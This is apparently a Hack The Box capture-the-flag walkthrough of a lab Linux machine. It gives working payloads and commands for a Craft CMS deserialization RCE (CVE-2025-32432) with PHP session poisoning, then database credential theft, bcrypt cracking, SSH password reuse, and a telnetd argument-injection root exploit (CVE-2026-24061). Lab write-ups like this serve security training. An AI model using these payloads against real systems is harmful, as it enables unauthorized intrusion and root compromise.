# 🛸 Orion — Hack The Box Walkthrough

> **Machine:** Orion (Linux)  
> **Difficulty:** Easy  
> **Category:** Web Exploitation, Credential Reuse, Privilege Escalation  
> **CVE:** CVE-2025-32432, CVE-2026-24061  
> **Target IP:** `10.129.35.129`

---

## 📋 Table of Contents

1. [Synopsis](#synopsis)
2. [Reconnaissance](#reconnaissance)
3. [Web Enumeration — Craft CMS](#web-enumeration--craft-cms)
4. [CVE-2025-32432 — Pre-Auth RCE](#cve-2025-32432--pre-auth-rce)
5. [Post-Exploitation — Database Credentials](#post-exploitation--database-credentials)
6. [MySQL — The Users Table](#mysql--the-users-table)
7. [SSH — Password Reuse](#ssh--password-reuse)
8. [Privilege Escalation — CVE-2026-24061](#privilege-escalation--cve-2026-24061)
9. [Flags](#flags)
10. [Attack Chain Summary](#attack-chain-summary)

---

## Synopsis

```ascii
+------------------------------------------------------------------------------+
|                              ORION TELECOM                                    |
|                   Internal Network Management Portal                           |
|                                                                               |
|   Attack Surface:                                                             |
|                                                                               |
|    +--------+       +------------------+       +------------+                 |
|    |  ME    |──────▶│  10.129.35.129   │       |            |                 |
|    | (Kali) |       │                  │       │ 127.0.0.1  |                 |
|    +--------+       │  ┌──── 22 ────┐  │       │  ┌──── 23 ────┐              |
|         ▲           │  │ SSH (OS)  │  │       │  │ Telnetd   │              |
|         │           │  └───────────┘  │       │  │ inetutils │              |
|         │           │                 │       │  │ v2.7      │              |
|         │           │  ┌──── 80 ────┐  │       │  └───────────┘              |
|         │           │  │ Craft CMS  │  │       +------------+                 |
|         │           │  │ v5.6.16    │  │                                     |
|         │           │  └───────────┘  │                                     |
|    RCE  │           │        │        │             CVE-2026-24061           |
|    via  │           │   MySQL│3306    │             ──────────────           |
|    CVE- │           │   127.0.0.1     │     USER=\"-f root\" telnet -a     |
│  2025- │           │        │        │     → Authentication Bypass         |
│  32432 │           │  ┌────▼────┐    │     → Root Shell                    |
│         │           │  │  .env   │    │                                     |
│         │           │  │  creds  │    │                                     |
│         │           │  └─────────┘    │                                     |
│         │           +------------------+                                     |
│         │   CVE-2025-32432             Password reuse                        |
│         └─────── pre-auth RCE ────▶   ───────▶  SSH as adam                  |
│                                                                               |
+------------------------------------------------------------------------------+
```

**Vulnerability Chain:** Craft CMS CVE-2025-32432 → RCE → MySQL creds → Password reuse → SSH → Telnetd injection → ROOT

**Orion** is an easy Linux box featuring a two-step exploit chain. The initial foothold exploits a pre-authentication Remote Code Execution vulnerability in **Craft CMS 5.6.16** — a PHP deserialization bug in the image transformation endpoint. After obtaining a shell as `www-data`, we extract MySQL credentials from the application's `.env` file, query the `users` table for a bcrypt password hash, crack it to `darkangel`, and reuse it for SSH access as user `adam`. From there, privilege escalation is achieved via **CVE-2026-24061**, an argument injection vulnerability in GNU inetutils `telnetd` 2.7 running on localhost port 23, granting a root shell.

---

## Reconnaissance

### Nmap Scan

```bash
nmap -sC -sV -oN nmap.txt 10.129.35.129
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15
80/tcp open  http    nginx 1.18.0 (Ubuntu)
```

Two ports exposed: **SSH** and **HTTP**. Port 23 is not exposed externally — it runs `telnetd` internally.

### Web Headers

```bash
curl -sI http://10.129.35.129 | head -5
```

```
HTTP/1.1 302 Moved Temporarily
Server: nginx/1.18.0 (Ubuntu)
Location: http://orion.htb/?p=admin/login
X-Powered-By: Craft CMS
```

The server redirects to an admin login panel. The `X-Powered-By: Craft CMS` header confirms the technology stack.

---

## Web Enumeration — Craft CMS

### The Login Page

```
┌──────────────────────────────────────────────┐
│          Orion Telecom Administration         │
│              ┌──────────────────┐             │
│              │  Sign In         │             │
│              └──────────────────┘             │
│                                              │
│           ┌─────────────────────────┐         │
│           │  Craft CMS 5.6.16       │         │
│           └─────────────────────────┘         │
└──────────────────────────────────────────────┘
```

Craft CMS 5.6.16 — vulnerable to **CVE-2025-32432**, a pre-authentication Remote Code Execution vulnerability discovered by Orange Cyberdefense CSIRT.

### Vulnerability Summary

```ascii
+--------------------------------------------------------------------+
|                   CVE-2025-32432                                      |
|                                                                      |
|   ┌──────────────────────────────────────────────────────────────┐  |
|   │  PHP Object Injection in Craft CMS Image Transform Endpoint  │  |
|   │                                                              │  │
|   │  Affects: Craft CMS 3.x, 4.x, 5.x < 5.6.17                  │  │
|   │  Endpoint: actions/assets/generate-transform                  │  │
|   │  Discovered: Orange Cyberdefense CSIRT (April 2025)          │  │
|   │                                                              │  │
|   │  Two gadget chains:                                          │  │
|   │    ┌─ GuzzleHttp\Psr7\FnStream  → Info leak (phpinfo)       │  │
|   │    └─ yii\rbac\PhpManager       → RCE (file inclusion)      │  │
|   └──────────────────────────────────────────────────────────────┘  │
|                                                                      |
|   ┌──── How PhpManager Works ───────────────────────────────────┐  |
|   │                                                              │  │
|   │  The __construct() method in PhpManager calls load(),       │  │
|   │  which does:                                                │  │
|   │                                                              │  │
|   │    public function load()                                    │  │
|   │    {                                                         │  │
|   │        if (is_file($this->itemFile)) {                       │  │
|   │            $items = include $this->itemFile;   ◄── RCE!     │  │
|   │        }                                                     │  │
|   │    }                                                         │  │
|   │                                                              │  │
|   │  By pointing itemFile at a session file containing           │  │
|   │  PHP code, we achieve code execution via include().         │  │
|   └──────────────────────────────────────────────────────────────┘  │
+--------------------------------------------------------------------+
```

The vulnerability lies in how Craft CMS deserializes user-supplied data in the image transformation endpoint. By crafting a malicious `handle` object with specific Yii behavior classes, we can achieve arbitrary code execution.

---

## CVE-2025-32432 — Pre-Auth RCE

### Step 1: Establish a Session

First we visit the login page to obtain a valid session cookie and CSRF token:

```bash
curl -s -D - -o /dev/null 'http://orion.htb/?p=admin/login'
```

```
Set-Cookie: CraftSessionId=r0nk...sess; path=/; HttpOnly
Set-Cookie: CRAFT_CSRF_TOKEN=...; path=/; HttpOnly
```

We extract:
- **CraftSessionId** — the PHP session identifier
- **CRAFT_CSRF_TOKEN** — the CSRF cookie (serialized)
- **csrfTokenValue** — the CSRF token from the HTML body (used in the `X-CSRF-Token` header)

### Step 2: Leak Information via FnStream Gadget

The `GuzzleHttp\Psr7\FnStream` gadget has a destructor that calls `($this->_fn_close)()` — a no-argument callable. We set `_fn_close` to `"phpinfo"` to leak critical system information:

```json
{
  "assetId": 11,
  "handle": {
    "width": 123, "height": 123,
    "as leak": {
      "class": "craft\\behaviors\\FieldLayoutBehavior",
      "__class": "GuzzleHttp\\Psr7\\FnStream",
      "__construct()": [[]],
      "_fn_close": "phpinfo"
    }
  }
}
```

```bash
# Send the exploit POST request
curl -s -X POST 'http://orion.htb/index.php?p=admin/actions/assets/generate-transform' \
  -H 'Content-Type: application/json' \
  -H 'X-CSRF-Token: <TOKEN>' \
  -b 'CraftSessionId=<SID>' \
  -d '{"assetId":11,"handle":{"width":123,"height":123,"as leak":{"class":"craft\\behaviors\\FieldLayoutBehavior","__class":"GuzzleHttp\\Psr7\\FnStream","__construct()":[[]],"_fn_close":"phpinfo"}}}'
```

**Output:** The full `phpinfo()` page is returned in the HTTP response. Key findings:

```
┌────────────────────────────────────────────────────────┐
│  session.save_path    => /var/lib/php/sessions          │
│  CRAFT_DB_DATABASE    => orion                          │
│  CRAFT_DB_USER        => root                           │
│  CRAFT_DB_PASSWORD    => SuperSecureCraft123Pass!       │
│  Document Root        => /var/www/html/craft/web/       │
│  disable_functions    => (none)                         │
│  open_basedir         => (none)                         │
└────────────────────────────────────────────────────────┘
```

We now know:
- Session files live at `/var/lib/php/sessions/`
- MySQL credentials: `root:SuperSecureCraft123Pass!`
- No PHP restrictions on command execution

### Step 3: Full RCE via PhpManager Chain

The `yii\rbac\PhpManager` gadget loads and interprets a file specified in its `itemFile` property via `include()`. The exploitation requires two requests orchestrated carefully:

```
┌─────────────────────────────────────────────────────────────────────┐
│                   SESSION POISONING MECHANISM                         │
│                                                                       │
│   ┌────────┐                 ┌──────────┐                 ┌────────┐ │
│   │Attacker│                 │  nginx   │                 │  PHP   │ │
│   │        │                 │  :80     │                 │  FPM   │ │
│   └───┬────┘                 └────┬─────┘                 └───┬────┘ │
│       │                          │                          │      │ │
│       │  Phase A: Poison         │                          │      │ │
│       ├──────────────────────────┤                          │      │ │
│       │  GET /?p=admin/dashboard │                          │      │ │
│       │  &x=<?=eval(...);die()?> │                          │      │ │
│       │  ────────────────────────▶                          │      │ │
│       │                          │                          │      │ │
│       │                          │  REQUEST_URI contains    │      │ │
│       │                          │  raw PHP code            │      │ │
│       │                          ├─────────────────────────▶│      │ │
│       │                          │                          │      │ │
│       │                          │                          │ Yii  │ │
│       │                          │                          │ saves│ │
│       │                          │                          │ return│ │
│       │                          │                          │ URL  │ │
│       │                          │                          │ to   │ │
│       │                          │                          │session│ │
│       │                          │                          │      │ │
│       │                          │                          │ Session:│ │
│       │                          │                          │ __return│ │
│       │                          │                          │ Url|s:56| │
│       │                          │                          │ "/?p=...│ │
│       │                          │                          │ &x=<?=  │ │
│       │                          │                          │ eval()..│ │
│       │                          │                          │ die()?>│ │
│       │                          │                          │      │ │
│       │  ──────── 302 Redirect ──┼──────────────────────────│      │ │
│       │◀─────────────────────────┤                          │      │ │
│       │                          │                          │      │ │
│       │                          │                          │      │ │
│       │  Phase B: Trigger        │                          │      │ │
│       ├──────────────────────────────────────────────────────┤      │ │
│       │  POST /index.php?p=admin/actions/assets/             │      │ │
│       │  generate-transform&x=system('id > /tmp/pwn');      │      │ │
│       │  ───────────────────────────────────────────────────▶│      │ │
│       │                          │                          │      │ │
│       │                          │  JSON body: PhpManager   │      │ │
│       │                          │  with itemFile =         │      │ │
│       │                          │  /var/lib/php/sessions/  │      │ │
│       │                          │  sess_<SID>              │      │ │
│       │                          ├─────────────────────────▶│      │ │
│       │                          │                          │      │ │
│       │                          │                          │include()│
│       │                          │                          │ session │
│       │                          │                          │ file    │
│       │                          │                          │ │      │
│       │                          │                          │ ▼ PHP  │
│       │                          │                          │ eval() │
│       │                          │                          │ executes│
│       │                          │                          │ command│
│       │                          │                          │ │      │
│       │                          │                          │ │ 500  │
│       │◀─────────────────────────┼──────────────────────────│ │error │
│       │                          │                          │/include│
│       │  RCE: check /tmp/pwn     │                          │ failed│
│       │◀────────────────────────────────────────────────────│      │
│       │                                                     │      │
└─────────────────────────────────────────────────────────────────────┘
```

### Phase A — Session Poisoning

We send a request to a protected page (`admin/dashboard`) with a **raw PHP stub** embedded in a GET parameter. The request must **not** be URL-encoded — this is the critical detail that the Metasploit module achieves via `uri_encode_mode => 'none'`.

```
GET /?p=admin/dashboard&x=<?=eval($_GET['x']);die()?>
```

When Yii processes this request, it detects an unauthenticated user trying to access a protected route. It calls `Yii::$app->user->loginRequired()`, which stores the current URL (from `$_SERVER['REQUEST_URI']`) as the return URL in the session:

```php
// Yii internals (simplified)
$_SESSION['__returnUrl'] = '/?p=admin/dashboard&x=<?=eval($_GET["x"]);die()?>';
```

The session file on disk then contains:
```
__returnUrl|s:56:"/?p=admin/dashboard&x=<?=eval($_GET['x']);die()?>";
```

If we use URL encoding (`%3C%3F%3Deval...`), the session file would contain the encoded version, which would NOT execute as PHP when included.

```python
import http.client

conn = http.client.HTTPConnection("orion.htb", 80)
conn.request("GET",
    "/?p=admin/dashboard&cmd=<?=eval($_GET['cmd']);die()?>",
    headers={"Cookie": "CraftSessionId=<SID>"})
```

The result: Craft CMS receives the request, detects an unauthenticated user, stores the return URL (containing our PHP) in the session, and redirects to the login page.

Session file content after poisoning:
```
__returnUrl|s:56:"/?p=admin/dashboard&cmd=<?=eval($_GET['cmd']);die()?>";
[...other session data...]
```

#### Phase B — Trigger Execution

We send a POST to the `generate-transform` endpoint with the PhpManager gadget, pointing `itemFile` at our poisoned session file:

```json
{
  "assetId": 11,
  "handle": {
    "width": 123, "height": 123,
    "as hack": {
      "class": "craft\\behaviors\\FieldLayoutBehavior",
      "__class": "yii\\rbac\\PhpManager",
      "__construct()": [{"itemFile": "/var/lib/php/sessions/sess_<SID>"}]
    }
  }
}
```

The command is passed as a GET parameter matching the one used in the session poisoning:

```
POST /index.php?p=admin/actions/assets/generate-transform&cmd=system('id > /var/www/html/craft/web/pwned.txt');
```

When PhpManager includes the session file:
- Everything before `<?=` is treated as plain text output
- `<?=eval($_GET['cmd']);die()?>` executes, running our command

**RCE Confirmed!**

```bash
$ curl http://orion.htb/pwned.txt
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```
┌────────────────────────────────┐
│  ✅  RCE ACHIEVED              │
│  www-data@orion                │
│  CVE-2025-32432 EXPLOITED      │
└────────────────────────────────┘
```

---

## Post-Exploitation — Database Credentials

### Reading the .env File

```bash
curl http://orion.htb/out_env.txt   # (written via RCE)
```

```
CRAFT_APP_ID=CraftCMS--67912ad2-1f1b-4993-bfec-e64daa5c23ff
CRAFT_ENVIRONMENT=dev
CRAFT_SECURITY_KEY=RRS86F6i2JQKdC6kfEI7frVxA47WVMx8
CRAFT_DB_DRIVER=mysql
CRAFT_DB_SERVER=127.0.0.1
CRAFT_DB_PORT=3306
CRAFT_DB_DATABASE=orion
CRAFT_DB_USER=root
CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!
```

MySQL is bound to `127.0.0.1` only, but we can query it through the RCE.

---

## MySQL — The Users Table

### Querying the Database

```bash
# Via RCE — write a SQL query to temp file and execute
echo "select id,username,email,password from users;" > /tmp/query.sql
mysql -h 127.0.0.1 -u root -pSuperSecureCraft123Pass! orion < /tmp/query.sql
```

```
id  username  email              password
1   admin     adam@orion.htb     $2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS
```

```
┌──────────────────────────────────────────────┐
│  Hash Algorithm:  bcrypt ($2y$13$)            │
│  Username:        admin / adam@orion.htb      │
│  Hash:            $2y$13$e9zuohgFZz...       │
│  Cracked:         darkangel                   │
└──────────────────────────────────────────────┘
```

### Cracking the Hash

```bash
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```

```
$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS:darkangel
```

The password is **`darkangel`** — a common word from the `rockyou.txt` wordlist.

---

## SSH — Password Reuse

Since the password was reused:

```bash
sshpass -p 'darkangel' ssh adam@orion.htb
```

```
adam@orion:~$ id
uid=1000(adam) gid=1000(adam) groups=1000(adam)

adam@orion:~$ cat user.txt
044659f32bd9e56500b2c77eb010cf02
```

```
┌────────────────────────────────┐
│  ✅  USER FLAG CAPTURED        │
│  044659f32bd9e56500b2c77eb... │
└────────────────────────────────┘
```

---

## Privilege Escalation — CVE-2026-24061

### Discovery

Checking the internal services, we find telnet running on localhost:

```bash
ss -tlnp | grep 23
LISTEN 0 128 127.0.0.1:23 0.0.0.0:*
```

```bash
telnet --version
telnet (GNU inetutils) 2.7
```

Version `2.7` of GNU inetutils telnetd is vulnerable to **CVE-2026-24061** — an argument injection vulnerability.

### Vulnerability Analysis

```ascii
┌─────────────────────────────────────────────────────────────────────┐
│                    CVE-2026-24061 — Argument Injection                 │
│                                                                       │
│   ┌────────┐         ┌──────────┐         ┌──────────┐              │
│   │Attacker│         │  telnet  │         │  login   │              │
│   │(adam)  │         │  client  │         │  binary  │              │
│   └───┬────┘         └────┬─────┘         └────┬─────┘              │
│       │                   │                    │                     │
│       │ USER="-f root"    │                    │                     │
│       │ telnet -a 127.0.0.1                    │                     │
│       │──────────────────▶│                    │                     │
│       │                   │                    │                     │
│       │                   │ NEW_ENVIRON option │                     │
│       │                   │ passes USER env var│                     │
│       │                   │───────────────────▶│                     │
│       │                   │                    │                     │
│       │                   │  /usr/bin/login     │                     │
│       │                   │  -f root            │                     │
│       │                   │                    │                     │
│       │                   │  The -f flag means  │                     │
│       │                   │  "skip password     │                     │
│       │                   │  authentication"    │                     │
│       │                   │                    │                     │
│       │                   │  ──── Root Shell ───│                     │
│       │                   │◀───────────────────│                     │
│       │◀──────────────────│                    │                     │
│       │                   │                    │                     │
│       │  root@orion:~# id                     │                     │
│       │  uid=0(root) gid=0(root)              │                     │
│       │                   │                    │                     │
│       +--- Technical Details:                 │                     │
│       │                                      │                     │
│       │  telnetd receives the USER env        │                     │
│       │  variable from the NEW_ENVIRON        │                     │
│       │  telnet option negotiation.           │                     │
│       │  The value is passed directly as      │                     │
│       │  an argument to /usr/bin/login:       │                     │
│       │                                      │                     │
│       │    exec("/usr/bin/login",             │                     │
│       │      ["-f", "root", "-h", "host"])    │                     │
│       │                                      │                     │
│       │  Since -f is a valid login flag       │                     │
│       │  meaning "skip auth", the session     │                     │
│       │  is immediately granted as root.      │                     │
│       └──────────────────────────────────────────                     │
└─────────────────────────────────────────────────────────────────────┘
```

### Exploitation

```bash
USER="-f root" telnet -a 127.0.0.1
```

```
┌──────────────────────────────────────────────────────┐
│  Trying 127.0.0.1...                                 │
│  Connected to 127.0.0.1.                             │
│  Escape character is '^]'.                           │
│                                                      │
│  Welcome to Ubuntu 22.04.5 LTS                       │
│                                                      │
│  root@orion:~# id                                    │
│  uid=0(root) gid=0(root) groups=0(root)              │
│  root@orion:~# cat /root/root.txt                    │
│  d7146e1e70d1b92deca0c6153038a7f2                    │
└──────────────────────────────────────────────────────┘
```

```
┌────────────────────────────────┐
│  ✅  ROOT FLAG CAPTURED        │
│  d7146e1e70d1b92deca0c61530... │
│  CVE-2026-24061 EXPLOITED      │
└────────────────────────────────┘
```

---

## Flags

| Flag Type | Value |
|-----------|-------|
| **User**  | `044659f32bd9e56500b2c77eb010cf02` |
| **Root**  | `d7146e1e70d1b92deca0c6153038a7f2` |

---

## Attack Chain Summary

```
┌──────────┐    ┌─────────────────┐    ┌──────────────┐    ┌─────────┐    ┌──────────────┐
│          │    │                 │    │              │    │         │    │              │
│  PORT 80 │───▶│  CVE-2025-32432 │───▶│  .env Leak   │───▶│ MySQL   │───▶│  bcrypt Hash │
│  Craft   │    │  PhpManager     │    │  Credentials │    │ Query   │    │  → darkangel │
│  CMS     │    │  → RCE          │    │              │    │         │    │              │
└──────────┘    └─────────────────┘    └──────────────┘    └─────────┘    └──────┬───────┘
                                                                                │
                                                                    ┌───────────▼───────────┐
                                                                    │  SSH 22                │
                                                                    │  adam:darkangel         │
                                                                    │  USER FLAG ✅          │
                                                                    └───────────┬───────────┘
                                                                                │
                                                                    ┌───────────▼───────────┐
                                                                    │  CVE-2026-24061        │
                                                                    │  telnetd 2.7           │
                                                                    │  USER="-f root"        │
                                                                    │  ROOT FLAG ✅          │
                                                                    └───────────────────────┘
```

### CVEs Used

| CVE | Component | Type | CVSS |
|-----|-----------|------|------|
| **CVE-2025-32432** | Craft CMS ≤ 5.6.16 | Pre-Auth RCE (PHP Object Injection) | 9.8 Critical |
| **CVE-2026-24061** | GNU inetutils telnetd ≤ 2.7 | Argument Injection / Auth Bypass | 8.1 High |

### MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|--------|-----------|----|
| Initial Access | Exploit Public-Facing Application | T1190 |
| Credential Access | Credentials from Configuration Files | T1552.001 |
| Credential Access | Brute Force (Password Cracking) | T1110 |
| Lateral Movement | SSH (Password Reuse) | T1021.004 |
| Privilege Escalation | Exploitation for Privilege Escalation | T1068 |
| Defense Evasion | Exploit via Valid Credentials | T1212 |

---

> **Tools Used:** nmap, curl, Python (requests, http.client), MySQL, hashcat, sshpass, telnet  
> **Walkthrough by:** kernel32  
> **Machine Author:** Pho3o  
